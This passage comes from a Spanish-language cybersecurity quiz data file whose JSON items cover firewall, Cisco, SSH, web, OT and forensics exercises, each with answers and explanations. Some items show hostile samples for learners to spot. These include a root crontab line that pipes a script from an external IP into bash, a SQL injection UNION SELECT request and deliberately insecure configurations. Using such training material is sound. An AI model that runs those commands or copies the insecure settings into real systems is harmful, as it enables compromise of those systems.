"Añade antes las reglas que permiten tu SSH, o te quedarás fuera."}, {"id": "R107", "type": "fill", "tag": "Linux", "level": "medio", "lives": 4, "q": "Deja pasar las respuestas de las conexiones que ya están abiertas.", "lines": ["iptables -A INPUT -m conntrack --ctstate {},RELATED -j ACCEPT"], "accept": ["established"], "answer": "ESTABLISHED", "len": 11, "hints": ["Establecidas, en inglés.", "Empieza por EST."], "hint": "Establecidas, en inglés.", "why": "ESTABLISHED acepta los paquetes de conexiones ya abiertas y RELATED los relacionados, como errores ICMP. Es lo que hace stateful al firewall.", "fix": "Coloca esta regla al principio: es la que más tráfico casa."}, {"id": "R108", "type": "fill", "tag": "Cisco", "level": "facil", "lives": 4, "q": "Esta ACL debe permitir la gestión solo desde la red de administración.", "lines": ["access-list 10 {} 192.168.50.0 0.0.0.255", "line vty 0 4", " access-class 10 in"], "accept": ["permit"], "answer": "permit", "len": 6, "hints": ["Lo contrario de deny.", "Empieza por p."], "hint": "Lo contrario de deny.", "why": "permit autoriza el origen indicado; el resto queda bloqueado por el deny implícito al final de toda ACL.", "fix": "Limita siempre la gestión a una red dedicada de administración."}, {"id": "R109", "type": "fill", "tag": "Cisco", "level": "medio", "lives": 4, "q": "Completa la máscara wildcard para que la regla cubra toda la red 192.168.50.0/24.", "lines": ["access-list 10 permit 192.168.50.0 {}"], "accept": ["0.0.0.255"], "answer": "0.0.0.255", "len": 9, "hints": ["Es la máscara al revés.", "Los tres primeros octetos son 0."], "hint": "Es la máscara al revés.", "why": "Las wildcard indican con 1 los bits que pueden variar: para una /24, los últimos 8 bits, es decir 0.0.0.255.", "fix": "Revisa las wildcard con cuidado: un error abre redes enteras."}, {"id": "R110", "type": "fill", "tag": "Cisco", "level": "facil", "lives": 4, "q": "Desactiva el servidor web de administración del switch, que no usas.", "lines": ["no ip http {}", "no ip http secure-server"], "accept": ["server"], "answer": "server", "len": 6, "hints": ["Servidor, en inglés.", "Seis letras."], "hint": "Servidor, en inglés.", "why": "no ip http server apaga la interfaz web sin cifrar. Cada servicio que no usas es superficie de ataque.", "fix": "Desactiva todo servicio de gestión que no necesites."}, {"id": "R111", "type": "fill", "tag": "Cisco", "level": "facil", "lives": 4, "q": "Haz que las contraseñas no aparezcan en claro al mostrar la configuración.", "lines": ["service {}-encryption"], "accept": ["password"], "answer": "password", "len": 8, "hints": ["Contraseña, en inglés.", "Empieza por pass."], "hint": "Contraseña, en inglés.", "why": "service password-encryption oculta las contraseñas tipo 7 al mostrar la configuración. Es un cifrado débil, pero evita miradas por encima del hombro.", "fix": "Usa además enable secret y algoritmos fuertes para las contraseñas de usuario."}, {"id": "R112", "type": "fill", "tag": "Cisco", "level": "facil", "lives": 4, "q": "Las líneas de gestión solo deben aceptar conexiones cifradas.", "lines": ["line vty 0 4", " login local", " transport input {}"], "accept": ["ssh"], "answer": "ssh", "len": 3, "hints": ["El sustituto de Telnet.", "Tres letras."], "hint": "El sustituto de Telnet.", "why": "transport input ssh rechaza Telnet en las líneas de gestión y deja solo SSH.", "fix": "Genera claves de al menos 2048 bits y usa SSH versión 2."}, {"id": "R113", "type": "fill", "tag": "Cisco", "level": "medio", "lives": 4, "q": "Antes de activar SSH necesitas generar las claves del switch.", "lines": ["crypto key generate {} modulus 2048"], "accept": ["rsa"], "answer": "rsa", "len": 3, "hints": ["El algoritmo clásico de clave pública.", "Tres letras."], "hint": "El algoritmo clásico de clave pública.", "why": "SSH en IOS necesita un par de claves RSA. Con 2048 bits se considera seguro.", "fix": "Tras generarlas, activa ip ssh version 2."}, {"id": "R114", "type": "fill", "tag": "Linux", "level": "dificil", "lives": 4, "q": "Buscas ejecutables con el bit SUID, que se ejecutan con los permisos de su dueño.", "lines": ["find / -perm -{} -type f 2>/dev/null"], "accept": ["4000", "u=s"], "answer": "4000", "len": 4, "hints": ["El bit SUID vale 4 en el primer dígito especial.", "Cuatro cifras."], "hint": "El bit SUID vale 4 en el primer dígito especial.", "why": "-perm -4000 encuentra ficheros con el bit SUID activado, un vector clásico de escalada de privilegios.", "fix": "Revisa la lista periódicamente: cualquier binario SUID nuevo es sospechoso."}, {"id": "R115", "type": "fill", "tag": "SSH", "level": "medio", "lives": 4, "q": "Genera una clave SSH con el algoritmo moderno recomendado.", "lines": ["ssh-keygen -t {} -C \"analista\""], "accept": ["ed25519"], "answer": "ed25519", "len": 7, "hints": ["Se basa en curvas elípticas.", "Empieza por ed."], "hint": "Se basa en curvas elípticas.", "why": "Ed25519 es más rápido y seguro que RSA con claves mucho más cortas.", "fix": "Protege la clave privada con frase de paso y cárgala con ssh-agent."}, {"id": "R116", "type": "line", "tag": "SSH", "level": "facil", "lives": 3, "q": "Este servidor solo debe aceptar acceso SSH con clave. ¿Qué línea lo impide?", "lines": ["Port 22", "Protocol 2", "PermitRootLogin no", "PubkeyAuthentication yes", "PasswordAuthentication yes", "X11Forwarding no", "MaxAuthTries 3"], "correct": 4, "answer": "PasswordAuthentication yes", "hint": "Hay una puerta trasera para quien no tiene clave.", "why": "Con PasswordAuthentication yes se sigue pudiendo entrar con contraseña, que se puede adivinar o robar.", "fix": "PasswordAuthentication no y claves Ed25519 protegidas con frase de paso."}, {"id": "R117", "type": "line", "tag": "Linux", "level": "medio", "lives": 3, "q": "Este firewall debe permitir SSH solo desde la red de gestión 10.50.0.0/24. ¿Qué línea lo rompe?", "lines": ["*filter", ":INPUT DROP [0:0]", "-A INPUT -i lo -j ACCEPT", "-A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT", "-A INPUT -p tcp --dport 22 -j ACCEPT", "-A INPUT -p icmp --icmp-type echo-request -s 10.50.0.0/24 -j ACCEPT", "COMMIT"], "correct": 4, "answer": "-A INPUT -p tcp --dport 22 -j ACCEPT", "hint": "A una regla le falta decir desde dónde.", "why": "La regla de SSH no tiene origen (-s), así que acepta conexiones desde cualquier red.", "fix": "Añade -s 10.50.0.0/24 y revisa todas las reglas que permiten servicios de gestión."}, {"id": "R118", "type": "line", "tag": "Forense", "level": "facil", "lives": 3, "q": "Revisas el log de autenticación de un servidor. ¿Qué línea demuestra que el atacante entró?", "lines": ["Nov 17 02:10:01 sshd: Failed password for root from 203.0.113.9", "Nov 17 02:10:03 sshd: Failed password for root from 203.0.113.9", "Nov 17 02:10:06 sshd: Failed password for admin from 203.0.113.9", "Nov 17 02:10:09 sshd: Failed password for admin from 203.0.113.9", "Nov 17 02:10:12 sshd: Accepted password for admin from 203.0.113.9", "Nov 17 02:10:12 sshd: pam_unix(sshd:session): session opened for user admin"], "correct": 4, "answer": "Accepted password for admin", "hint": "Tras muchos fallos, uno funciona.", "why": "Después de varios intentos fallidos, la contraseña de admin acaba siendo aceptada desde la misma IP: un ataque de fuerza bruta con éxito.", "fix": "Bloqueo tras varios fallos, sin contraseñas en SSH y alertas cuando un acceso exitoso sigue a muchos fallidos."}, {"id": "R119", "type": "line", "tag": "Web", "level": "medio", "lives": 3, "q": "Cualquiera puede ver la lista de todos los ficheros que suben los usuarios. ¿Qué línea lo provoca?", "lines": ["server {", "    listen 443 ssl;", "    server_name portal.empresa.es;", "    root /var/www/portal;", "    location /uploads/ {", "        autoindex on;", "    }", "}"], "correct": 5, "answer": "autoindex on;", "hint": "Algo genera un índice automático de la carpeta.", "why": "autoindex on muestra un listado de todos los ficheros de la carpeta, incluidos los de otros usuarios.", "fix": "autoindex off y, mejor aún, servir las subidas a través de la aplicación con control de acceso."}, {"id": "R120", "type": "line", "tag": "Docker", "level": "medio", "lives": 3, "q": "La base de datos solo debe ser accesible desde la aplicación, no desde la red. ¿Qué línea la expone?", "lines": ["services:", "  app:", "    image: portal:2.4", "    depends_on: [db]", "  db:", "    image: postgres:16", "    ports:", "      - \"5432:5432\"", "    environment:", "      POSTGRES_PASSWORD_FILE: /run/secrets/db"], "correct": 7, "answer": "\"5432:5432\"", "hint": "La app ya llega a la base de datos por la red interna de Docker.", "why": "Publicar el puerto 5432 abre la base de datos en todas las interfaces del servidor. La app no lo necesita.", "fix": "Quita ports del servicio de base de datos; si necesitas acceso local, publica solo en 127.0.0.1."}, {"id": "R121", "type": "line", "tag": "Secretos", "level": "facil", "lives": 3, "q": "Este fichero se subió por error a un repositorio público. ¿Qué línea hay que tratar como comprometida ya?", "lines": ["APP_ENV=production", "LOG_LEVEL=info", "DB_HOST=db", "DB_USER=portal", "DB_PASSWORD=Pr0d!Portal2026", "TZ=Europe/Madrid"], "correct": 4, "answer": "DB_PASSWORD", "hint": "Hay un dato que, una vez publicado, ya no es secreto.", "why": "Una contraseña publicada hay que darla por comprometida, aunque se borre después: el historial y los rastreadores ya la tienen.", "fix": "Rota la contraseña, limpia el historial del repositorio y usa un gestor de secretos."}, {"id": "R122", "type": "line", "tag": "Cisco", "level": "facil", "lives": 3, "q": "Este puerto conecta el ordenador de recepción. ¿Qué línea sobra y es peligrosa?", "lines": ["interface Gi0/12", " description PC-Recepcion", " switchport mode trunk", " switchport access vlan 20", " spanning-tree portfast", " spanning-tree bpduguard enable"], "correct": 2, "answer": "switchport mode trunk", "hint": "Un PC no necesita varias VLAN.", "why": "En modo trunk, el equipo conectado puede enviar tráfico etiquetado a cualquier VLAN permitida: un salto de VLAN servido.", "fix": "switchport mode access en todos los puertos de usuario."}, {"id": "R123", "type": "line", "tag": "FortiGate", "level": "medio", "lives": 3, "q": "Esta política da acceso VPN al grupo de mantenimiento solo para programar un PLC por S7. ¿Qué línea abre de más?", "lines": ["config firewall policy", "    edit 40", "        set srcintf \"ssl.root\"", "        set dstintf \"ot\"", "        set srcaddr \"ssl-pool\"", "        set dstaddr \"plc-linea2\"", "        set groups \"mantenimiento\"", "        set service \"ALL\"", "        set action accept", "    next", "end"], "correct": 7, "answer": "set service \"ALL\"", "hint": "El origen, el destino y el grupo están bien acotados.", "why": "Con service ALL, quien entre por la VPN puede usar cualquier protocolo contra el PLC, no solo S7.", "fix": "Define un servicio S7 (TCP 102) y limita la política a él."}, {"id": "R124", "type": "line", "tag": "Linux", "level": "facil", "lives": 3, "q": "¿Qué tarea programada de root no debería estar ahí?", "lines": ["# m h dom mon dow command", "0 3 * * * /usr/local/bin/backup.sh", "*/5 * * * * /usr/lib/sysstat/sa1 1 1", "* * * * * curl -s http://198.51.100.7/x.sh | bash", "30 2 * * 0 /usr/sbin/logrotate /etc/logrotate.conf"], "correct": 3, "answer": "curl … | bash", "hint": "Una descarga desde una IP externa cada minuto.", "why": "Descargar un script de una IP externa y ejecutarlo como root cada minuto es una persistencia clásica de un atacante.", "fix": "Monitoriza los cambios en crontab y bloquea la salida a internet de servidores que no la necesitan."}, {"id": "R125", "type": "line", "tag": "Correo", "level": "medio", "lives": 3, "q": "¿Qué línea de esta zona DNS permite que cualquiera envíe correo en nombre del dominio?", "lines": ["@        IN  MX   10 mail.empresa.es.", "mail     IN  A    203.0.113.25", "www      IN  A    203.0.113.30", "@        IN  TXT  \"v=spf1 +all\"", "_dmarc   IN  TXT  \"v=DMARC1; p=none\""], "correct": 3, "answer": "v=spf1 +all", "hint": "Fíjate en el signo del final.", "why": "+all autoriza a cualquier servidor del mundo a enviar correo del dominio: anula el SPF.", "fix": "Lista solo tus servidores y termina en -all; después sube DMARC a quarantine o reject."}, {"id": "R126", "type": "line", "tag": "Web", "level": "medio", "lives": 3, "q": "¿Qué petición del log consiguió sacar datos de la base de datos?", "lines": ["GET /productos?id=12 200 4310", "GET /productos?id=12' 500 512", "GET /productos?id=12 OR 1=1 403 0", "GET /productos?id=12 UNION SELECT user,pass FROM usuarios 200 48231", "GET /contacto 200 2201"], "correct": 3, "answer": "UNION SELECT … 200 48231", "hint": "Mira el código de respuesta y el tamaño.", "why": "La petición con UNION SELECT devolvió un 200 y una respuesta enorme: la inyección SQL funcionó y extrajo la tabla de usuarios.", "fix": "Consultas parametrizadas, WAF y alertas por respuestas de tamaño anómalo."}, {"id": "R127", "type": "line", "tag": "OT", "level": "medio", "lives": 3, "q": "El SCADA (10.30.1.10) solo lee datos del PLC. ¿Qué línea delata un cambio no autorizado?", "lines": ["10.30.1.10 → PLC  Modbus FC03 Read Holding Registers 40001-40010", "10.30.1.10 → PLC  Modbus FC03 Read Holding Registers 40001-40010", "10.30.1.10 → PLC  Modbus FC01 Read Coils 1-16", "10.30.1.77 → PLC  Modbus FC06 Write Single Register 40005 = 9999", "10.30.1.10 → PLC  Modbus FC03 Read Holding Registers 40001-40010"], "correct": 3, "answer": "FC06 Write desde 10.30.1.77", "hint": "Distinto origen y distinta función.", "why": "Una escritura (función 6) desde un equipo que no es el SCADA cambia una consigna del proceso.", "fix": "Firewall con inspección Modbus que solo permita lecturas y solo desde el SCADA."}, {"id": "R128", "type": "line", "tag": "Exfiltración", "level": "medio", "lives": 3, "q": "Revisas las conexiones salientes de la noche. ¿Cuál es la sospechosa?", "lines": ["01:02 10.20.0.15 → 203.0.113.80:443   12 KB", "01:30 10.20.0.15 → 203.0.113.80:443   9 KB", "02:11 10.20.0.31 → 198.51.100.2:53    1 KB", "03:12 10.20.0.44 → 192.0.2.150:8443   2,3 GB", "04:00 10.20.0.15 → 203.0.113.80:443   11 KB"], "correct": 3, "answer": "2,3 GB a las 03:12", "hint": "Una de ellas es enorme y a deshoras.", "why": "Más de 2 GB hacia un destino desconocido en plena madrugada es el patrón típico de exfiltración.", "fix": "Alertas por volumen saliente anómalo y filtrado de salida por destino."}, {"id": "R129", "type": "line", "tag": "Active Directory", "level": "medio", "lives": 3, "q": "Revisas los eventos del controlador de dominio. ¿Cuál indica que alguien se ha dado privilegios?", "lines": ["03:01 4624 Inicio de sesión correcto: svc_backup", "03:02 4720 Cuenta creada: svc_backup2", "03:02 4722 Cuenta habilitada: svc_backup2", "03:03 4728 Miembro añadido a Domain Admins: svc_backup2", "03:05 4634 Cierre de sesión: svc_backup"], "correct": 3, "answer": "4728 Domain Admins", "hint": "Crear una cuenta no da poder por sí solo.", "why": "El evento 4728 registra que la cuenta nueva entró en Domain Admins: control total del dominio.", "fix": "Alertas inmediatas ante cambios en grupos privilegiados y revisión de quién puede hacerlos."}, {"id": "R130", "type": "line", "tag": "Cisco", "level": "facil", "lives": 3, "q": "¿Qué línea permite a cualquiera cambiar la configuración del switch por SNMP?", "lines": ["hostname SW-PLANTA", "snmp-server location Nave-2", "snmp-server contact redes@empresa.es", "snmp-server community public RW", "logging host 10.50.0.20"], "correct": 3, "answer": "community public RW", "hint": "RW significa lectura y escritura.", "why": "Una comunidad «public» con permiso de escritura permite modificar la configuración a cualquiera que la conozca, y es la que todo el mundo prueba.", "fix": "SNMPv3 con autenticación y cifrado, y nunca comunidades con permiso de escritura."}, {"id": "R131", "type": "line", "tag": "Switching", "level": "medio", "lives": 3, "q": "Este troncal va a la oficina y no debe llevar la VLAN 30, la de control. ¿Qué línea falla?", "lines": ["interface Te1/0/48", " description Troncal-Oficina", " switchport mode trunk", " switchport trunk native vlan 999", " switchport trunk allowed vlan 10,20,30"], "correct": 4, "answer": "allowed vlan 10,20,30", "hint": "Mira qué VLAN deja pasar.", "why": "El troncal lleva la VLAN 30 a la oficina: los equipos de control quedan alcanzables desde ese lado.", "fix": "Permite en cada troncal solo las VLAN que de verdad necesita."}, {"id": "R132", "type": "line", "tag": "Wi-Fi", "level": "medio", "lives": 3, "q": "¿Qué línea deja la Wi-Fi de planta con un cifrado obsoleto?", "lines": ["interface=wlan0", "ssid=PLANTA-SENSORES", "wpa=2", "wpa_key_mgmt=WPA-PSK", "rsn_pairwise=TKIP", "ieee80211w=1"], "correct": 4, "answer": "rsn_pairwise=TKIP", "hint": "Hay un cifrado anterior a AES.", "why": "TKIP es un cifrado heredado y débil; WPA2 debe usar CCMP (AES).", "fix": "rsn_pairwise=CCMP y, si los equipos lo soportan, WPA3."}, {"id": "R133", "type": "line", "tag": "Linux", "level": "medio", "lives": 3, "q": "El usuario deploy solo debe poder reiniciar la aplicación. ¿Qué línea le da demasiado?", "lines": ["root    ALL=(ALL:ALL) ALL", "%admin  ALL=(ALL) ALL", "deploy  ALL=(ALL) NOPASSWD: ALL", "monitor ALL=(root) NOPASSWD: /usr/bin/systemctl status portal"], "correct": 2, "answer": "deploy … NOPASSWD: ALL", "hint": "Compara con la línea de monitor.", "why": "deploy puede ejecutar cualquier comando como root sin contraseña: si alguien roba esa cuenta, tiene el servidor.", "fix": "deploy ALL=(root) NOPASSWD: /usr/bin/systemctl restart portal"}, {"id": "R134", "type": "line", "tag": "Linux", "level": "dificil", "lives": 3, "q": "¿Qué cuenta tiene privilegios de root sin llamarse root?", "lines": ["root:x:0:0:root:/root:/bin/bash", "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin", "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin", "backup:x:0:0:backup:/var/backups:/bin/bash", "analista:x:1000:1000::/home/analista:/bin/bash"], "correct": 3, "answer": "backup con UID 0", "hint": "El poder lo da el número, no el nombre.", "why": "Lo que hace root a una cuenta es el UID 0. backup tiene UID 0 y shell: es un root camuflado.", "fix": "Alerta ante cualquier cuenta con UID 0 distinta de root."}, {"id": "R135", "type": "line", "tag": "TLS", "level": "medio", "lives": 3, "q": "Esta web admite versiones de TLS obsoletas. ¿Qué línea lo provoca?", "lines": ["server {", "    listen 443 ssl http2;", "    ssl_certificate /etc/ssl/portal.pem;", "    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;", "    ssl_prefer_server_ciphers on;", "}"], "correct": 3, "answer": "ssl_protocols TLSv1 TLSv1.1 TLSv1.2", "hint": "Dos de esas versiones ya están retiradas.", "why": "TLS 1.0 y 1.1 están obsoletos y tienen debilidades conocidas.", "fix": "ssl_protocols TLSv1.2 TLSv1.3;"}, {"id": "R136", "type": "line", "tag": "Cisco", "level": "medio", "lives": 3, "q": "Esta ACL debería bloquear Telnet. ¿Qué línea hace que no bloquee nada?", "lines": ["ip access-list extended FILTRO", " 10 permit ip any any", " 20 deny tcp any any eq 23", " 30 permit tcp any any eq 22", " 40 deny ip any any log"], "correct": 1, "answer": "10 permit ip any any", "hint": "Se evalúa de arriba abajo.", "why": "La primera regla permite todo, así que las siguientes nunca llegan a aplicarse.", "fix": "Ordena de lo específico a lo general y deja el permiso amplio, si lo hay, al final."}, {"id": "R137", "type": "line", "tag": "Bases de datos", "level": "facil", "lives": 3, "q": "MySQL solo debe aceptar conexiones del propio servidor. ¿Qué línea lo impide?", "lines": ["[mysqld]", "port = 3306", "bind-address = 0.0.0.0", "max_connections = 200", "log_error = /var/log/mysql/error.log"], "correct": 2, "answer": "bind-address = 0.0.0.0", "hint": "Hay una dirección que significa «todas».", "why": "0.0.0.0 hace que MySQL escuche en todas las interfaces de red.", "fix": "bind-address = 127.0.0.1 y firewall local como segunda capa."}, {"id": "R138", "type": "line", "tag": "Monitorización", "level": "facil", "lives": 3, "q": "Este panel de monitorización está accesible desde toda la oficina. ¿Qué línea es la más peligrosa?", "lines": ["[server]", "http_port = 3000", "[security]", "admin_user = admin", "admin_password = admin", "[auth.anonymous]", "enabled = false"], "correct": 4, "answer": "admin_password = admin", "hint": "Credenciales que cualquiera probaría.", "why": "Usuario y contraseña admin/admin son lo primero que prueba cualquiera.", "fix": "Cambia las credenciales por defecto en la instalación y usa autenticación centralizada."}, {"id": "R139", "type": "line", "tag": "Logs", "level": "dificil", "lives": 3, "q": "Tras un incidente no aparece ningún inicio de sesión en los logs. ¿Qué línea lo explica?", "lines": ["*.info;mail.none;authpriv.none   /var/log/messages", "auth,authpriv.*                   /dev/null", "mail.*                            -/var/log/maillog", "cron.*                            /var/log/cron", "*.* @@10.50.0.20:514"], "correct": 1, "answer": "auth,authpriv.* /dev/null", "hint": "/dev/null es un agujero negro.", "why": "Los mensajes de autenticación se envían a /dev/null, así que se descartan sin guardarse.", "fix": "Vigila los cambios en la configuración de logs y envía siempre la autenticación al servidor central."}, {"id": "R140", "type": "line", "tag": "Kubernetes", "level": "medio", "lives": 3, "q": "Este pod solo sirve una web. ¿Qué línea le da acceso total al nodo?", "lines": ["apiVersion: v1", "kind: Pod", "metadata:", "  name: portal", "spec:", "  containers:", "  - name: web", "    image: portal:2.4", "    securityContext:", "      privileged: true"], "correct": 9, "answer": "privileged: true", "hint": "Un contenedor que no está contenido.", "why": "Un contenedor privilegiado tiene acceso a los dispositivos del nodo: escapar del contenedor es trivial.", "fix": "privileged: false, sin root y con políticas que impidan pods privilegiados."}, {"id": "R141", "type": "line", "tag": "Web", "level": "dificil", "lives": 3, "q": "Esta API interna usa la sesión del usuario. ¿Qué cabecera permite que cualquier web la llame en su nombre?", "lines": ["location /api/ {", "    proxy_pass http://app:8080;", "    add_header X-Content-Type-Options nosniff;", "    add_header Access-Control-Allow-Origin $http_origin;", "    add_header Access-Control-Allow-Credentials true;", "}"], "correct": 3, "answer": "Access-Control-Allow-Origin $http_origin", "hint": "Devuelve como permitido cualquier origen que llegue.", "why": "Reflejar el origen junto con credenciales permite que cualquier web haga peticiones autenticadas a la API desde el navegador de la víctima.", "fix": "Lista explícita de orígenes permitidos y credenciales solo cuando hagan falta."}, {"id": "R142", "type": "line", "tag": "DHCP", "level": "medio", "lives": 3, "q": "Los usuarios reciben IP y puertas de enlace extrañas. ¿Qué línea del log lo explica?", "lines": ["DHCPDISCOVER from 3c:52:82:aa:10:01", "DHCPOFFER on 10.20.0.51 from 10.20.0.1", "DHCPOFFER on 10.20.0.99 from 10.20.0.66", "DHCPREQUEST for 10.20.0.99 from 3c:52:82:aa:10:01", "DHCPACK on 10.20.0.99 from 10.20.0.66"], "correct": 2, "answer": "DHCPOFFER from 10.20.0.66", "hint": "Hay dos servidores ofreciendo IP.", "why": "10.20.0.66 no es el servidor DHCP legítimo: alguien ha montado uno falso para desviar el tráfico.", "fix": "DHCP snooping en los switches y localizar el puerto del servidor falso."}, {"id": "R143", "type": "line", "tag": "DNS", "level": "medio", "lives": 3, "q": "¿Qué consulta del log de DNS apunta a un túnel?", "lines": ["portal.empresa.es A", "www.google.com A", "mail.empresa.es MX", "a9f3e1c7b2d40e8f6a1c3b5d7e9f0a2c.x7-sync.net TXT", "update.microsoft.com A"], "correct": 3, "answer": "a9f3e1c7… .x7-sync.net TXT", "hint": "Un subdominio que nadie escribiría a mano.", "why": "Un subdominio largo y aleatorio con registros TXT es el patrón típico de datos codificados dentro de DNS.", "fix": "Fuerza el uso de tus resolvers y alerta por entropía y longitud de las consultas."}, {"id": "R144", "type": "line", "tag": "OT", "level": "facil", "lives": 3, "q": "Desde los equipos de planta no debería salir nada a internet. ¿Qué línea del proxy es un problema?", "lines": ["10.20.0.15 GET https://portal.empresa.es/", "10.20.0.31 GET https://update.microsoft.com/", "10.30.1.15 GET http://198.51.100.40/upd.exe", "10.20.0.15 GET https://www.boe.es/"], "correct": 2, "answer": "10.30.1.15 descargando upd.exe", "hint": "Mira qué rango de IP es de planta.", "why": "10.30.1.15 es un equipo de la red de control descargando un ejecutable de una IP desconocida.", "fix": "Sin salida a internet desde OT; las actualizaciones, a través de un servidor intermedio en la DMZ."}, {"id": "R145", "type": "order", "tag": "TCP", "level": "facil", "lives": 3, "q": "Ordena el inicio de una conexión TCP.", "items": ["El cliente envía SYN", "El servidor responde SYN-ACK", "El cliente responde ACK", "Empiezan a enviarse datos"], "correct": [0, 1, 2, 3], "start": [2, 0, 3, 1], "answer": "SYN, SYN-ACK, ACK y datos", "hint": "Primero se pide, luego se confirma.", "why": "El saludo en tres pasos sincroniza los números de secuencia antes de enviar datos.", "fix": "Un aluvión de SYN sin ACK final es un SYN flood: los SYN cookies lo mitigan."}, {"id": "R146", "type": "order", "tag": "DHCP", "level": "facil", "lives": 3, "q": "Ordena cómo obtiene IP un equipo por DHCP.", "items": ["Discover: el cliente busca servidores", "Offer: el servidor ofrece una IP", "Request: el cliente pide esa IP", "Ack: el servidor la confirma"], "correct": [0, 1, 2, 3], "start": [3, 1, 0, 2], "answer": "Discover, Offer, Request, Ack", "hint": "Se recuerda como DORA.", "why": "DHCP sigue el proceso DORA: descubrir, ofrecer, solicitar y confirmar.", "fix": "DHCP snooping evita que un servidor falso responda en el paso de Offer."}, {"id": "R147", "type": "order", "tag": "Respuesta", "level": "medio", "lives": 3, "q": "Ordena las fases de respuesta a un incidente.", "items": ["Preparación", "Detección y análisis", "Contención", "Erradicación", "Recuperación", "Lecciones aprendidas"], "correct": [0, 1, 2, 3, 4, 5], "start": [2, 0, 5, 1, 4, 3], "answer": "Preparación, detección, contención, erradicación, recuperación, lecciones", "hint": "Primero se prepara, al final se aprende.", "why": "Es el ciclo clásico de NIST: sin contener primero, erradicar es inútil porque el atacante vuelve.", "fix": "Practica el ciclo con simulacros, también en OT."}, {"id": "R148", "type": "order", "tag": "Forense", "level": "dificil", "lives": 3, "q": "Vas a recoger evidencias de un servidor comprometido. Ordénalas de la más volátil a la menos volátil.", "items": ["Memoria RAM", "Conexiones de red y procesos", "Ficheros temporales", "Disco duro", "Copias de seguridad"], "correct": [0, 1, 2, 3, 4], "start": [3, 0, 4, 2, 1], "answer": "RAM, red y procesos, temporales, disco, copias", "hint": "Lo que se pierde al apagar va primero.", "why": "El orden de volatilidad indica recoger primero lo que desaparece antes; la RAM se pierde al apagar.", "fix": "Ten preparadas herramientas de adquisición de memoria antes de necesitarlas."}, {"id": "R149", "type": "order", "tag": "Purdue", "level": "medio", "lives": 3, "q": "Ordena los niveles del modelo Purdue, de la planta física a la empresa.", "items": ["Sensores y actuadores", "PLC y controladores", "SCADA y HMI", "Operaciones de planta", "Red corporativa"], "correct": [0, 1, 2, 3, 4], "start": [4, 2, 0, 3, 1], "answer": "Sensores, PLC, SCADA, operaciones, corporativo", "hint": "Empieza por lo que toca el proceso.", "why": "Purdue ordena por niveles: del proceso físico (0) a la empresa (4 y 5), con la DMZ industrial entre 3 y 4.", "fix": "Usa los niveles para limitar qué puede hablar con qué."}, {"id": "R150", "type": "order", "tag": "DNS", "level": "medio", "lives": 3, "q": "Ordena cómo se resuelve un dominio que nadie ha consultado antes.", "items": ["El equipo pregunta a su resolver", "El resolver pregunta a un servidor raíz", "El resolver pregunta al servidor del TLD (.es)", "El resolver pregunta al servidor autoritativo del dominio", "El resolver devuelve la IP al equipo"], "correct": [0, 1, 2, 3, 4], "start": [3, 1, 4, 0, 2], "answer": "Resolver, raíz, TLD, autoritativo y respuesta", "hint": "De lo más general a lo más concreto.", "why": "El resolver baja por la jerarquía: raíz, dominio de primer nivel y servidor autoritativo.", "fix": "Usa resolvers propios y bloquea el DNS saliente directo desde los equipos."}, {"id": "R151", "type": "order", "tag": "Firewall", "level": "medio", "lives": 3, "q": "Ordena las reglas para que los usuarios naveguen, el servidor de backup salga solo a su nube y todo lo demás quede bloqueado.", "items": ["Permitir backup → nube del proveedor (443)", "Bloquear backup → cualquier destino", "Permitir usuarios → internet (80, 443)", "Bloquear y registrar todo lo demás"], "correct": [0, 1, 2, 3], "start": [2, 3, 1, 0], "answer": "Excepción del backup, bloqueo del backup, usuarios, bloqueo final", "hint": "Las excepciones van antes de la regla que las cubre.", "why": "La primera regla que coincide gana: la excepción del backup tiene que ir antes de su bloqueo.", "fix": "Revisa el orden tras cada cambio: una regla mal colocada anula las siguientes."}, {"id": "R152", "type": "order", "tag": "Kill chain", "level": "medio", "lives": 3, "q": "Ordena las fases típicas de un ataque.", "items": ["Reconocimiento", "Acceso inicial", "Persistencia", "Movimiento lateral", "Exfiltración o impacto"], "correct": [0, 1, 2, 3, 4], "start": [2, 4, 0, 3, 1], "answer": "Reconocimiento, acceso, persistencia, movimiento lateral, impacto", "hint": "Primero se estudia el objetivo.", "why": "Un ataque suele avanzar de reconocer a entrar, quedarse, moverse y actuar. Cortarlo en cualquier fase lo detiene.", "fix": "Pon detección en cada fase, no solo en el perímetro."}, {"id": "R153", "type": "order", "tag": "TLS", "level": "dificil", "lives": 3, "q": "Ordena el inicio de una conexión TLS 1.2.", "items": ["ClientHello con versiones y cifrados", "ServerHello y certificado del servidor", "Intercambio de claves", "Finished: ambos confirman", "Datos cifrados de la aplicación"], "correct": [0, 1, 2, 3, 4], "start": [1, 4, 2, 0, 3], "answer": "ClientHello, ServerHello, claves, Finished, datos", "hint": "Lo primero es decir qué sabes hablar.", "why": "Cliente y servidor acuerdan versión y cifrado, el servidor se identifica, se intercambian claves y se confirma antes de enviar datos.", "fix": "Desactiva versiones antiguas para que la negociación no pueda bajar a ellas."}, {"id": "R154", "type": "order", "tag": "Kerberos", "level": "dificil", "lives": 3, "q": "Ordena cómo accede un usuario a un servicio con Kerberos.", "items": ["El usuario se autentica ante el KDC", "Recibe un TGT", "Pide un ticket para el servicio con el TGT", "Presenta el ticket al servicio"], "correct": [0, 1, 2, 3], "start": [2, 0, 3, 1], "answer": "Autenticación, TGT, ticket de servicio y acceso", "hint": "Primero el ticket para pedir tickets.", "why": "El TGT sirve para pedir tickets de servicio sin volver a usar la contraseña.", "fix": "Vigila peticiones anómalas de tickets: ataques como Kerberoasting abusan de ese paso."}, {"id": "R155", "type": "order", "tag": "OT", "level": "medio", "lives": 3, "q": "Ordena cómo aplicar un parche en un sistema de control.", "items": ["Probarlo en un entorno de pruebas", "Acordar la ventana con operación", "Hacer copia de seguridad del sistema", "Aplicarlo", "Verificar que el proceso funciona"], "correct": [0, 1, 2, 3, 4], "start": [3, 0, 4, 2, 1], "answer": "Pruebas, ventana, copia, parche y verificación", "hint": "En OT no se parchea a ciegas.", "why": "Un parche que falla puede parar una planta: se prueba, se acuerda, se respalda y luego se aplica y verifica.", "fix": "Documenta un procedimiento de parcheo OT y haz que operación lo firme."}, {"id": "R156", "type": "order", "tag": "Ransomware", "level": "medio", "lives": 3, "q": "Tras un ransomware vas a restaurar desde copia. Ordena los pasos.", "items": ["Contener: aislar los equipos afectados", "Encontrar cómo entró el atacante", "Cerrar esa vía 